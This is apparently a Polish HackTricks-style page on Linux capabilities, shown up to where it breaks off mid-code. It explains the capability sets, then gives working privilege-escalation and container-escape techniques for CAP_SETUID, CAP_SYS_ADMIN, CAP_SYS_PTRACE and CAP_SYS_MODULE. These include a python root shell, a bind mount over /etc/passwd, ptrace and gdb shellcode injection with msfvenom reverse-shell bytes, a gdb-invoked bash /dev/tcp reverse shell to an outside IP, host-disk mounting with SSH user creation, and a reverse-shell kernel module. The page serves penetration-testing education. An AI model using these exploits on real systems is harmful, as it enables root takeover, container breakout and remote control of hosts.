# Linux Capabilities

{{#include ../../banners/hacktricks-training.md}}

Linux capabilities dzielą **uprawnienia root na mniejsze, odrębne jednostki**, umożliwiając procesom posiadanie podzbioru uprawnień. Minimalizuje to ryzyko, ponieważ nie przyznaje pełnych uprawnień root, gdy nie jest to konieczne.<sup>[[3]](#references)[[4]](#references)[[5]](#references)[[14]](#references)</sup>

### Problem:

- Zwykli użytkownicy mają ograniczone uprawnienia do wykonywania operacji, takich jak otwieranie raw sockets lub bindowanie portów internetowych poniżej 1024; capabilities mogą przyznać tylko wymagane uprawnienie zamiast pełnych uprawnień root.<sup>[[14]](#references)</sup>

### Zbiory capabilities:

Linux udostępnia te zbiory capabilities dla każdego wątku, a kernel stosuje ich ograniczenia, gdy proces zmienia credentials lub wykonuje plik.<sup>[[14]](#references)</sup>

1. **Dziedziczony (CapInh)**:

- **Cel**: Identyfikuje capabilities, które mogą zostać uwzględnione w zbiorze dozwolonych po `execve()`, gdy wykonywany plik ma pasujące inheritable file capabilities.
- **Funkcjonalność**: Zbiór inheritable wątku jest zachowywany podczas `execve()`; sam w sobie nie uaktywnia tych capabilities.
- **Ograniczenia**: Dodawanie capability do tego zbioru jest ograniczone przez zbiory permitted i bounding.<sup>[[14]](#references)</sup>

2. **Efektywny (CapEff)**:

- **Cel**: Reprezentuje rzeczywiste capabilities używane przez proces w danym momencie.
- **Funkcjonalność**: Jest to zbiór capabilities sprawdzany przez kernel w celu przyznania uprawnień do różnych operacji. W przypadku plików zbiór ten może być flagą wskazującą, czy permitted capabilities pliku mają być uznawane za effective.
- **Znaczenie**: Zbiór effective ma kluczowe znaczenie dla natychmiastowych kontroli uprawnień i działa jako aktywny zbiór capabilities, których proces może używać.

3. **Dozwolony (CapPrm)**:

- **Cel**: Definiuje maksymalny zbiór capabilities, które może posiadać proces.
- **Funkcjonalność**: Proces może przenieść capability ze zbioru permitted do zbioru effective, uzyskując możliwość jej używania. Może również usuwać capabilities ze swojego zbioru permitted.
- **Granica**: Jeśli capability zostanie usunięta z tego zbioru, normalnie nie można jej przywrócić bez wykonania pliku, który ją przyznaje, lub innej uprzywilejowanej zmiany kontekstu.<sup>[[14]](#references)</sup>

4. **Ograniczający (CapBnd)**:

- **Cel**: Ogranicza capabilities, które proces może uzyskać z pliku podczas `execve()`, oraz te, które może dodać do swojego zbioru inheritable.
- **Funkcjonalność**: Zbiór jest dziedziczony podczas `fork()` i zachowywany podczas `execve()`; capabilities można z niego usuwać, gdy wywołujący posiada `CAP_SETPCAP`.
- **Zastosowanie**: Usunięcie niepotrzebnych capabilities z tego zbioru ogranicza późniejsze uzyskiwanie uprawnień.<sup>[[14]](#references)</sup>

5. **Ambient (CapAmb)**:
- **Cel**: Umożliwia wybranym capabilities pozostanie w zbiorach permitted i effective podczas `execve()` programu nieuprzywilejowanego.
- **Funkcjonalność**: Ambient capabilities są dodawane do nowych zbiorów permitted i effective, gdy wykonywany plik nie jest uprzywilejowany.
- **Ograniczenia**: Capability może być ambient tylko wtedy, gdy znajduje się jednocześnie w zbiorach permitted i inheritable; wykonanie pliku set-user-ID/set-group-ID lub pliku z capabilities czyści zbiór ambient.<sup>[[8]](#references)[[9]](#references)[[14]](#references)</sup>

## Capabilities procesów i plików binarnych

### Capabilities procesów

Aby zobaczyć capabilities konkretnego procesu, użyj pliku **status** w katalogu /proc. Ponieważ zawiera on więcej szczegółów, ograniczmy wyświetlane informacje tylko do tych związanych z Linux capabilities.\
Pamiętaj, że dla wszystkich uruchomionych procesów informacje o capabilities są przechowywane osobno dla każdego wątku, natomiast file capabilities są przechowywane w rozszerzonych atrybutach `security.capability`.<sup>[[14]](#references)[[15]](#references)</sup>

Capabilities są zdefiniowane w /usr/include/linux/capability.h

Capabilities bieżącego procesu możesz znaleźć za pomocą `cat /proc/self/status` lub `capsh --print`, a capabilities innych procesów w `/proc/<pid>/status`.<sup>[[15]](#references)[[26]](#references)</sup>
```bash
cat /proc/1234/status | grep Cap
cat /proc/$$/status | grep Cap #This will print the capabilities of the current process
```
To polecenie powinno zwrócić pięć wierszy capabilities w większości systemów.<sup>[[15]](#references)</sup>

- CapInh = Inherited capabilities
- CapPrm = Permitted capabilities
- CapEff = Effective capabilities
- CapBnd = Bounding set
- CapAmb = Ambient capabilities set
```bash
#These are the typical capabilities of a root owned process (all)
CapInh: 0000000000000000
CapPrm: 0000003fffffffff
CapEff: 0000003fffffffff
CapBnd: 0000003fffffffff
CapAmb: 0000000000000000
```
Te liczby szesnastkowe nie mają sensu. Za pomocą narzędzia `capsh` możemy zdekodować je do nazw capabilities.<sup>[[26]](#references)</sup>
```bash
capsh --decode=0000003fffffffff
0x0000003fffffffff=cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,37
```
Sprawdźmy teraz **capabilities** używane przez `ping`:
```bash
cat /proc/9491/status | grep Cap
CapInh:    0000000000000000
CapPrm:    0000000000003000
CapEff:    0000000000000000
CapBnd:    0000003fffffffff
CapAmb:    0000000000000000

capsh --decode=0000000000003000
0x0000000000003000=cap_net_admin,cap_net_raw
```
Chociaż to działa, istnieje inny i prostszy sposób. Aby wyświetlić capabilities uruchomionego procesu, użyj narzędzia **getpcaps**, podając jego identyfikator procesu (PID); narzędzie akceptuje również listę identyfikatorów procesów.<sup>[[22]](#references)</sup>
```bash
getpcaps 1234
```
Sprawdźmy możliwości `tcpdump` po nadaniu plikowi binarnemu uprawnień `cap_net_admin` i `cap_net_raw` w celu przechwytywania ruchu sieciowego (`tcpdump` działa w procesie 9562).<sup>[[22]](#references)[[25]](#references)</sup>
```bash
#The following command give tcpdump the needed capabilities to sniff traffic
$ setcap cap_net_raw,cap_net_admin=eip /usr/sbin/tcpdump

$ getpcaps 9562
Capabilities for `9562': = cap_net_admin,cap_net_raw+ep

$ cat /proc/9562/status | grep Cap
CapInh:    0000000000000000
CapPrm:    0000000000003000
CapEff:    0000000000003000
CapBnd:    0000003fffffffff
CapAmb:    0000000000000000

$ capsh --decode=0000000000003000
0x0000000000003000=cap_net_admin,cap_net_raw
```
Jak widać, capabilities odpowiadają wynikom dwóch sposobów sprawdzania procesu. Narzędzie `getpcaps` używa libcap do sprawdzania capabilities procesu docelowego i wyświetla je w formie tekstowej; przyjmuje jeden lub więcej PID-ów.<sup>[[22]](#references)</sup>

### Capabilities plików binarnych

Pliki binarne mogą mieć capabilities plików, które są stosowane podczas wykonywania. Na przykład plik binarny `ping` może posiadać capability `cap_net_raw`.<sup>[[14]](#references)</sup>
```bash
getcap /usr/bin/ping
/usr/bin/ping = cap_net_raw+ep
```
Możesz **wyszukiwać pliki binarne z capabilities** za pomocą `getcap -r`.<sup>[[23]](#references)</sup>
```bash
getcap -r / 2>/dev/null
```
### Usuwanie capabilities za pomocą capsh

Jeśli usuniemy `CAP_NET_RAW` z obowiązującego `bounding set`, program wymagający tej capability nie powinien już móc jej używać.<sup>[[26]](#references)</sup>
```bash
capsh --drop=cap_net_raw --print -- -c "tcpdump"
```
Oprócz wyniku samego polecenia _capsh_ polecenie _tcpdump_ również powinno zgłosić błąd.

> /bin/bash: /usr/sbin/tcpdump: Operation not permitted

Błąd pokazuje, że `tcpdump` nie może zostać uruchomiony z żądanymi capabilities pliku po usunięciu `CAP_NET_RAW` z bounding set.

### Usuwanie capabilities

Możesz usunąć capabilities pliku za pomocą `setcap -r`.<sup>[[25]](#references)</sup>
```bash
setcap -r </path/to/binary>
```
## Możliwości użytkownika

Linux nie przypisuje capabilities plikom bezpośrednio do zalogowanego użytkownika, ale moduł PAM `pam_cap` może ustawiać inheritable capabilities dla uwierzytelnionych sesji za pomocą `/etc/security/capability.conf`.<sup>[[16]](#references)</sup> Każdy wpis mapuje rozdzielone przecinkami nazwy lub numery capabilities na jedną lub więcej nazw użytkowników.<sup>[[17]](#references)</sup>
Przykład pliku:
```bash
# Simple
cap_sys_ptrace               developer
cap_net_raw                  user1

# Multiple capablities
cap_net_admin,cap_net_raw    jrnetadmin
# Identical, but with numeric values
12,13                        jrnetadmin

# Combining names and numerics
cap_sys_admin,22,25          jrsysadmin
```
## Możliwości środowiska

Skompilowanie poniższego programu umożliwia **uruchomienie powłoki bash wewnątrz środowiska udostępniającego capabilities**.<sup>[[14]](#references)</sup>
```c:ambient.c
/*
* Test program for the ambient capabilities
*
* compile using:
* gcc -Wl,--no-as-needed -lcap-ng -o ambient ambient.c
* Set effective, inherited and permitted capabilities to the compiled binary
* sudo setcap cap_setpcap,cap_net_raw,cap_net_admin,cap_sys_nice+eip ambient
*
* To get a shell with additional caps that can be inherited do:
*
* ./ambient /bin/bash
*/

#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <errno.h>
#include <sys/prctl.h>
#include <linux/capability.h>
#include <cap-ng.h>

static void set_ambient_cap(int cap) {
int rc;
capng_get_caps_process();
rc = capng_update(CAPNG_ADD, CAPNG_INHERITABLE, cap);
if (rc) {
printf("Cannot add inheritable cap\n");
exit(2);
}
capng_apply(CAPNG_SELECT_CAPS);
/* Note the two 0s at the end. Kernel checks for these */
if (prctl(PR_CAP_AMBIENT, PR_CAP_AMBIENT_RAISE, cap, 0, 0)) {
perror("Cannot set cap");
exit(1);
}
}
void usage(const char * me) {
printf("Usage: %s [-c caps] new-program new-args\n", me);
exit(1);
}
int default_caplist[] = {
CAP_NET_RAW,
CAP_NET_ADMIN,
CAP_SYS_NICE,
-1
};
int * get_caplist(const char * arg) {
int i = 1;
int * list = NULL;
char * dup = strdup(arg), * tok;
for (tok = strtok(dup, ","); tok; tok = strtok(NULL, ",")) {
list = realloc(list, (i + 1) * sizeof(int));
if (!list) {
perror("out of memory");
exit(1);
}
list[i - 1] = atoi(tok);
list[i] = -1;
i++;
}
return list;
}
int main(int argc, char ** argv) {
int rc, i, gotcaps = 0;
int * caplist = NULL;
int index = 1; // argv index for cmd to start
if (argc < 2)
usage(argv[0]);
if (strcmp(argv[1], "-c") == 0) {
if (argc <= 3) {
usage(argv[0]);
}
caplist = get_caplist(argv[2]);
index = 3;
}
if (!caplist) {
caplist = (int * ) default_caplist;
}
for (i = 0; caplist[i] != -1; i++) {
printf("adding %d to ambient list\n", caplist[i]);
set_ambient_cap(caplist[i]);
}
printf("Ambient forking shell\n");
if (execv(argv[index], argv + index))
perror("Cannot exec");
return 0;
}
```

```bash
gcc -Wl,--no-as-needed -lcap-ng -o ambient ambient.c
sudo setcap cap_setpcap,cap_net_raw,cap_net_admin,cap_sys_nice+eip ambient
./ambient /bin/bash
```
Wewnątrz **bash wykonywanego przez skompilowany plik binarny ambient** można zaobserwować **nowe capabilities** (zwykły użytkownik nie będzie mieć żadnych capabilities w sekcji „current”).<sup>[[14]](#references)</sup>
```bash
capsh --print
Current: = cap_net_admin,cap_net_raw,cap_sys_nice+eip
```
> [!CAUTION]
> Możesz **dodawać wyłącznie capabilities obecne** zarówno w zbiorze dozwolonym, jak i dziedziczonym.<sup>[[14]](#references)</sup>

### Binaria świadome capabilities/nieświadome capabilities

Binary nieświadome capabilities to program z capabilities pliku, który nie używa libcap do zarządzania nimi. Jeśli ustawiony jest jego bit effective, kernel włącza dozwolone capabilities pliku do zbioru effective procesu; wykonanie może się nie powieść, jeśli proces nie uzyskał wszystkich dozwolonych capabilities.<sup>[[14]](#references)</sup>

## Capabilities usługi

Usługa systemowa uruchomiona jako root może zachować szerokie capabilities, chyba że jej środowisko wykonawcze je ogranicza. W jednostce systemd `User=` wybiera użytkownika usługi, a `AmbientCapabilities=` dodaje nazwane capabilities do zbioru ambient wykonywanego procesu.<sup>[[18]](#references)</sup>
```bash
[Service]
User=bob
AmbientCapabilities=CAP_NET_BIND_SERVICE
```
## Capabilities w kontenerach Docker

Docker uruchamia kontenery z domyślnym zestawem capabilities, który można zmienić za pomocą `--cap-add` i `--cap-drop`; przykładowy kontener można przeanalizować za pomocą `amicontained`.<sup>[[19]](#references)[[24]](#references)</sup>
```bash
docker run --rm -it  r.j3ss.co/amicontained bash
Capabilities:
BOUNDING -> chown dac_override fowner fsetid kill setgid setuid setpcap net_bind_service net_raw sys_chroot mknod audit_write setfcap

# Add a capabilities
docker run --rm -it --cap-add=SYS_ADMIN r.j3ss.co/amicontained bash

# Add all capabilities
docker run --rm -it --cap-add=ALL r.j3ss.co/amicontained bash

# Remove all and add only one
docker run --rm -it  --cap-drop=ALL --cap-add=SYS_PTRACE r.j3ss.co/amicontained bash
```
## Privesc/Container Escape

Capabilities są przydatne, gdy **chcesz ograniczyć własne procesy po wykonaniu uprzywilejowanych operacji** (np. po skonfigurowaniu chroot i powiązaniu z socketem). Można je jednak wykorzystać, przekazując im złośliwe commands lub arguments, które są następnie uruchamiane jako root.<sup>[[2]](#references)</sup>

Możesz wymusić capabilities plików na programach za pomocą `setcap`, a następnie sprawdzić je za pomocą `getcap`.<sup>[[23]](#references)[[25]](#references)</sup>
```bash
#Set Capability
setcap cap_net_raw+ep /sbin/ping

#Get Capability
getcap /sbin/ping
/sbin/ping = cap_net_raw+ep
```
W przypadku tekstu capabilities pliku `+ep` podnosi określoną capability w zbiorach effective i permitted; `-` obniża wybrane flagi.<sup>[[21]](#references)</sup>

Aby zidentyfikować programy w systemie lub folderze z capabilities, użyj `getcap -r`.<sup>[[23]](#references)</sup>
```bash
getcap -r / 2>/dev/null
```
### Przykład exploitacji

W poniższym przykładzie binarka `/usr/bin/python2.6` okazuje się podatna na privesc:
```bash
setcap cap_setuid+ep /usr/bin/python2.7
/usr/bin/python2.7 = cap_setuid+ep

#Exploit
/usr/bin/python2.7 -c 'import os; os.setuid(0); os.system("/bin/bash");'
```
**Capabilities** wymagane przez `tcpdump`, aby **umożliwić dowolnemu użytkownikowi przechwytywanie pakietów**:
```bash
setcap cap_net_raw,cap_net_admin=eip /usr/sbin/tcpdump
getcap /usr/sbin/tcpdump
/usr/sbin/tcpdump = cap_net_admin,cap_net_raw+eip
```
### Szczególny przypadek „pustych” capabilities

Plik może zawierać pusty zestaw capabilities (`getcap myelf` zwraca `myelf =ep`). Pusty zestaw nie przyznaje żadnych capabilities; w połączeniu z bitem set-user-ID należącym do root program nadal może zmienić efektywne i zachowane identyfikatory uruchomionego procesu na 0, bez uzyskania file capabilities. Plik bez właściciela, niebędący plikiem SUID/SGID, z `=ep` nie uruchamia się jako root.<sup>[[14]](#references)</sup>

## CAP_SYS_ADMIN

**[`CAP_SYS_ADMIN`](https://man7.org/linux/man-pages/man7/capabilities.7.html)** to niezwykle potężna capability systemu Linux, często utożsamiana z poziomem niemal równym root ze względu na rozległe **uprawnienia administracyjne**, takie jak montowanie urządzeń lub manipulowanie funkcjami kernela. Chociaż jest niezbędna w kontenerach symulujących całe systemy, **`CAP_SYS_ADMIN` stwarza poważne wyzwania związane z bezpieczeństwem**, szczególnie w środowiskach konteneryzowanych, ze względu na możliwość eskalacji uprawnień i przejęcia systemu. Dlatego jej użycie wymaga rygorystycznych ocen bezpieczeństwa i ostrożnego zarządzania, przy czym zdecydowanie zaleca się usuwanie tej capability z kontenerów przeznaczonych dla konkretnych aplikacji, aby przestrzegać **zasady najmniejszych uprawnień** i minimalizować powierzchnię ataku.<sup>[[14]](#references)</sup>

**Przykład z użyciem binarnego pliku**
```bash
getcap -r / 2>/dev/null
/usr/bin/python2.7 = cap_sys_admin+ep
```
Za pomocą Pythona można zamontować zmodyfikowany plik _passwd_ na rzeczywistym pliku _passwd_:
```bash
cp /etc/passwd ./ #Create a copy of the passwd file
openssl passwd -1 -salt abc password #Get hash of "password"
vim ./passwd #Change roots passwords of the fake passwd file
```
I na koniec **zamontuj** zmodyfikowany plik `passwd` w `/etc/passwd`:
```python
from ctypes import *
libc = CDLL("libc.so.6")
libc.mount.argtypes = (c_char_p, c_char_p, c_char_p, c_ulong, c_char_p)
MS_BIND = 4096
source = b"/path/to/fake/passwd"
target = b"/etc/passwd"
filesystemtype = b"none"
options = b"rw"
mountflags = MS_BIND
libc.mount(source, target, filesystemtype, mountflags, options)
```
I będziesz mógł użyć **`su` jako root**, używając hasła „password”.

**Przykład ze środowiskiem (Docker breakout)**

Możesz sprawdzić włączone capabilities wewnątrz kontenera Dockera za pomocą:
```
capsh --print
Current: = cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read+ep
Bounding set =cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read
Securebits: 00/0x0/1'b0
secure-noroot: no (unlocked)
secure-no-suid-fixup: no (unlocked)
secure-keep-caps: no (unlocked)
uid=0(root)
gid=0(root)
groups=0(root)
```
W poprzednim wyniku widać, że capability SYS_ADMIN jest włączona.<sup>[[14]](#references)</sup>

- **Mount**

Przy odpowiednim dostępie do urządzeń i namespace'ów może to umożliwić kontenerowi Docker **zamontowanie dysku hosta i uzyskanie dostępu do jego zawartości**.<sup>[[14]](#references)</sup>
```bash
fdisk -l #Get disk name
Disk /dev/sda: 4 GiB, 4294967296 bytes, 8388608 sectors
Units: sectors of 1 * 512 = 512 bytes
Sector size (logical/physical): 512 bytes / 512 bytes
I/O size (minimum/optimal): 512 bytes / 512 bytes

mount /dev/sda /mnt/ #Mount it
cd /mnt
chroot ./ bash #You have a shell inside the docker hosts disk
```
- **Pełny dostęp**

W poprzedniej metodzie udało nam się uzyskać dostęp do dysku hosta.\
Jeśli host uruchamia serwer **ssh**, możesz **utworzyć użytkownika na zamontowanym dysku** i uzyskać do niego dostęp przez SSH.<sup>[[14]](#references)</sup>
```bash
#Like in the example before, the first step is to mount the docker host disk
fdisk -l
mount /dev/sda /mnt/

#Then, search for open ports inside the docker host
nc -v -n -w2 -z 172.17.0.1 1-65535
(UNKNOWN) [172.17.0.1] 2222 (?) open

#Finally, create a new user inside the docker host and use it to access via SSH
chroot /mnt/ adduser john
ssh john@172.17.0.1 -p 2222
```
## CAP_SYS_PTRACE

Dzięki `CAP_SYS_PTRACE` proces może śledzić i analizować inne procesy widoczne w jego przestrzeni nazw PID. Aby wskazywać procesy hosta z kontenera Docker, współdziel przestrzeń nazw PID hosta za pomocą `--pid=host` (lub dołącz do przestrzeni nazw zawierającej cel).<sup>[[14]](#references)[[20]](#references)</sup>

**[`CAP_SYS_PTRACE`](https://man7.org/linux/man-pages/man7/capabilities.7.html)** zapewnia możliwość korzystania z funkcji debugowania i śledzenia wywołań systemowych udostępnianych przez `ptrace(2)` oraz wywołań dołączania do pamięci między procesami, takich jak `process_vm_readv(2)` i `process_vm_writev(2)`. Chociaż jest to przydatne do celów diagnostycznych i monitorowania, włączenie `CAP_SYS_PTRACE` bez restrykcyjnych środków, takich jak filtr seccomp dla `ptrace(2)`, może znacząco osłabić bezpieczeństwo systemu. W szczególności może zostać wykorzystane do obejścia innych ograniczeń bezpieczeństwa, zwłaszcza tych narzuconych przez seccomp, co pokazują [proofs of concept (PoC) takie jak ten](https://gist.github.com/thejh/8346f47e359adecd1d53).<sup>[[10]](#references)</sup>

**Przykład z binary (python)**
```bash
getcap -r / 2>/dev/null
/usr/bin/python2.7 = cap_sys_ptrace+ep
```

```python
import ctypes
import sys
import struct
# Macros defined in <sys/ptrace.h>
# https://code.woboq.org/qt5/include/sys/ptrace.h.html
PTRACE_POKETEXT = 4
PTRACE_GETREGS = 12
PTRACE_SETREGS = 13
PTRACE_ATTACH = 16
PTRACE_DETACH = 17
# Structure defined in <sys/user.h>
# https://code.woboq.org/qt5/include/sys/user.h.html#user_regs_struct
class user_regs_struct(ctypes.Structure):
_fields_ = [
("r15", ctypes.c_ulonglong),
("r14", ctypes.c_ulonglong),
("r13", ctypes.c_ulonglong),
("r12", ctypes.c_ulonglong),
("rbp", ctypes.c_ulonglong),
("rbx", ctypes.c_ulonglong),
("r11", ctypes.c_ulonglong),
("r10", ctypes.c_ulonglong),
("r9", ctypes.c_ulonglong),
("r8", ctypes.c_ulonglong),
("rax", ctypes.c_ulonglong),
("rcx", ctypes.c_ulonglong),
("rdx", ctypes.c_ulonglong),
("rsi", ctypes.c_ulonglong),
("rdi", ctypes.c_ulonglong),
("orig_rax", ctypes.c_ulonglong),
("rip", ctypes.c_ulonglong),
("cs", ctypes.c_ulonglong),
("eflags", ctypes.c_ulonglong),
("rsp", ctypes.c_ulonglong),
("ss", ctypes.c_ulonglong),
("fs_base", ctypes.c_ulonglong),
("gs_base", ctypes.c_ulonglong),
("ds", ctypes.c_ulonglong),
("es", ctypes.c_ulonglong),
("fs", ctypes.c_ulonglong),
("gs", ctypes.c_ulonglong),
]

libc = ctypes.CDLL("libc.so.6")

pid=int(sys.argv[1])

# Define argument type and respone type.
libc.ptrace.argtypes = [ctypes.c_uint64, ctypes.c_uint64, ctypes.c_void_p, ctypes.c_void_p]
libc.ptrace.restype = ctypes.c_uint64

# Attach to the process
libc.ptrace(PTRACE_ATTACH, pid, None, None)
registers=user_regs_struct()

# Retrieve the value stored in registers
libc.ptrace(PTRACE_GETREGS, pid, None, ctypes.byref(registers))
print("Instruction Pointer: " + hex(registers.rip))
print("Injecting Shellcode at: " + hex(registers.rip))

# Shell code copied from exploit db. https://github.com/0x00pf/0x00sec_code/blob/master/mem_inject/infect.c
shellcode = "\x48\x31\xc0\x48\x31\xd2\x48\x31\xf6\xff\xc6\x6a\x29\x58\x6a\x02\x5f\x0f\x05\x48\x97\x6a\x02\x66\xc7\x44\x24\x02\x15\xe0\x54\x5e\x52\x6a\x31\x58\x6a\x10\x5a\x0f\x05\x5e\x6a\x32\x58\x0f\x05\x6a\x2b\x58\x0f\x05\x48\x97\x6a\x03\x5e\xff\xce\xb0\x21\x0f\x05\x75\xf8\xf7\xe6\x52\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x48\x8d\x3c\x24\xb0\x3b\x0f\x05"

# Inject the shellcode into the running process byte by byte.
for i in xrange(0,len(shellcode),4):
# Convert the byte to little endian.
shellcode_byte_int=int(shellcode[i:4+i].encode('hex'),16)
shellcode_byte_little_endian=struct.pack("<I", shellcode_byte_int).rstrip('\x00').encode('hex')
shellcode_byte=int(shellcode_byte_little_endian,16)

# Inject the byte.
libc.ptrace(PTRACE_POKETEXT, pid, ctypes.c_void_p(registers.rip+i),shellcode_byte)

print("Shellcode Injected!!")

# Modify the instuction pointer
registers.rip=registers.rip+2

# Set the registers
libc.ptrace(PTRACE_SETREGS, pid, None, ctypes.byref(registers))
print("Final Instruction Pointer: " + hex(registers.rip))

# Detach from the process.
libc.ptrace(PTRACE_DETACH, pid, None, None)
```
**Przykład z plikiem binarnym (gdb)**

`gdb` z capability `ptrace`:
```
/usr/bin/gdb = cap_sys_ptrace+ep
```
Utwórz shellcode za pomocą msfvenom do wstrzyknięcia do pamięci za pośrednictwem gdb
```python
# msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.11 LPORT=9001 -f py -o revshell.py
buf =  b""
buf += b"\x6a\x29\x58\x99\x6a\x02\x5f\x6a\x01\x5e\x0f\x05"
buf += b"\x48\x97\x48\xb9\x02\x00\x23\x29\x0a\x0a\x0e\x0b"
buf += b"\x51\x48\x89\xe6\x6a\x10\x5a\x6a\x2a\x58\x0f\x05"
buf += b"\x6a\x03\x5e\x48\xff\xce\x6a\x21\x58\x0f\x05\x75"
buf += b"\xf6\x6a\x3b\x58\x99\x48\xbb\x2f\x62\x69\x6e\x2f"
buf += b"\x73\x68\x00\x53\x48\x89\xe7\x52\x57\x48\x89\xe6"
buf += b"\x0f\x05"

# Divisible by 8
payload = b"\x90" * (-len(buf) % 8) + buf

# Change endianess and print gdb lines to load the shellcode in RIP directly
for i in range(0, len(buf), 8):
chunk = payload[i:i+8][::-1]
chunks = "0x"
for byte in chunk:
chunks += f"{byte:02x}"

print(f"set {{long}}($rip+{i}) = {chunks}")
```
Debuguj proces root za pomocą gdb i skopiuj-wklej wcześniej wygenerowane linie gdb:
```bash
# Let's write the commands to a file
echo 'set {long}($rip+0) = 0x296a909090909090
set {long}($rip+8) = 0x5e016a5f026a9958
set {long}($rip+16) = 0x0002b9489748050f
set {long}($rip+24) = 0x48510b0e0a0a2923
set {long}($rip+32) = 0x582a6a5a106ae689
set {long}($rip+40) = 0xceff485e036a050f
set {long}($rip+48) = 0x6af675050f58216a
set {long}($rip+56) = 0x69622fbb4899583b
set {long}($rip+64) = 0x8948530068732f6e
set {long}($rip+72) = 0x050fe689485752e7
c' > commands.gdb
# In this case there was a sleep run by root
## NOTE that the process you abuse will die after the shellcode
/usr/bin/gdb -p $(pgrep sleep)
[...]
(gdb) source commands.gdb
Continuing.
process 207009 is executing new program: /usr/bin/dash
[...]
```
**Przykład ze środowiskiem (Docker breakout) - Another gdb Abuse**

Jeśli **GDB** jest zainstalowany (lub możesz go zainstalować na przykład za pomocą `apk add gdb` albo `apt install gdb`), możesz **debugować proces z hosta** i sprawić, by wywołał funkcję `system`. (Ta technika wymaga również capability `SYS_ADMIN`)**.**
```bash
gdb -p 1234
(gdb) call (void)system("ls")
(gdb) call (void)system("sleep 5")
(gdb) call (void)system("bash -c 'bash -i >& /dev/tcp/192.168.115.135/5656 0>&1'")
```
Nie będziesz w stanie zobaczyć wyniku wykonanego polecenia, ale zostanie ono wykonane przez ten proces (więc uzyskaj rev shell).

> [!WARNING]
> Jeśli otrzymasz błąd "No symbol "system" in current context.", sprawdź poprzedni przykład ładowania shellcode do programu za pomocą gdb.

**Example with environment (Docker breakout) - Shellcode Injection**

Możesz sprawdzić włączone capabilities wewnątrz kontenera docker za pomocą:
```bash
capsh --print
Current: = cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_sys_ptrace,cap_mknod,cap_audit_write,cap_setfcap+ep
Bounding set =cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_sys_ptrace,cap_mknod,cap_audit_write,cap_setfcap
Securebits: 00/0x0/1'b0
secure-noroot: no (unlocked)
secure-no-suid-fixup: no (unlocked)
secure-keep-caps: no (unlocked)
uid=0(root)
gid=0(root)
groups=0(root
```
List **procesy** działające na **hoście** `ps -eaf`

1. Pobierz **architekturę** `uname -m`
2. Znajdź **shellcode** dla architektury ([https://www.exploit-db.com/exploits/41128](https://www.exploit-db.com/exploits/41128))
3. Znajdź **program** do **wstrzyknięcia** **shellcode** do pamięci procesu ([https://github.com/0x00pf/0x00sec_code/blob/master/mem_inject/infect.c](https://github.com/0x00pf/0x00sec_code/blob/master/mem_inject/infect.c))
4. **Zmodyfikuj** **shellcode** wewnątrz programu i **skompiluj** go `gcc inject.c -o inject`
5. **Wstrzyknij** go i przejmij swój **shell**: `./inject 299; nc 172.17.0.1 5600`

## CAP_SYS_MODULE

**[`CAP_SYS_MODULE`](https://man7.org/linux/man-pages/man7/capabilities.7.html)** umożliwia procesowi **ładowanie i usuwanie modułów jądra (wywołania systemowe `init_module(2)`, `finit_module(2)` i `delete_module(2)`)**, zapewniając bezpośredni dostęp do podstawowych operacji jądra. Ta capability stwarza poważne zagrożenia bezpieczeństwa, ponieważ załadowanie modułu może zmodyfikować działanie jądra i pokonać granice izolacji.<sup>[[6]](#references)[[14]](#references)</sup>
**Umożliwia to wstawianie lub usuwanie modułów w jądrze widocznym dla procesu; w kontenerze to, czy jest to jądro hosta, zależy od konfiguracji izolacji**.<sup>[[14]](#references)</sup>

**Przykład z plikiem binarnym**

W poniższym przykładzie plik binarny **`python`** ma tę capability.
```bash
getcap -r / 2>/dev/null
/usr/bin/python2.7 = cap_sys_module+ep
```
Domyślnie polecenie **`modprobe`** sprawdza listę zależności i pliki mapowania w katalogu **`/lib/modules/$(uname -r)`**.\
Aby to wykorzystać, utwórzmy fałszywy katalog **lib/modules**:
```bash
mkdir lib/modules -p
cp -a /lib/modules/5.0.0-20-generic/ lib/modules/$(uname -r)
```
Następnie **skompiluj moduł jądra, którego 2 przykłady znajdują się poniżej, i skopiuj** go do tego folderu:
```bash
cp reverse-shell.ko lib/modules/$(uname -r)/
```
Na koniec wykonaj niezbędny kod Pythona, aby załadować ten moduł jądra:
```python
import kmod
